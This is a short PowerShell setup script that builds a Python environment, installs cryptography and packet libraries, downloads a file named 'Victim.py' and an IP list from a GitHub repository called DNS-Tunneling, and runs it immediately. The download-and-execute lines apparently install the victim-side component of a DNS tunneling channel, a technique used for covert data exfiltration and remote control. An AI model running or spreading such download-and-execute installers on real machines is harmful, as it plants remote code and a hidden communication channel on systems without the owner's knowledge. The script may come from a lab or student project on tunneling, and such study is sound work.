mkdir C:\scripts
$env:Path += ';C:\scripts'
cd C:\scripts

python -m venv env
.\env\Scripts\Activate.ps1

pip install pyDH
pip install secrets
pip install pycryptodome 
pip install scapy

$WebClient = New-Object System.Net.WebClient
$WebClient.DownloadFile("https://raw.githubusercontent.com/ShacharMarkovich/DNS-Tunneling/main/Victim.py","C:\scripts\v.py")
$WebClient.DownloadFile("https://raw.githubusercontent.com/ShacharMarkovich/DNS-Tunneling/main/ip.txt","C:\scripts\ip.txt")

python v.py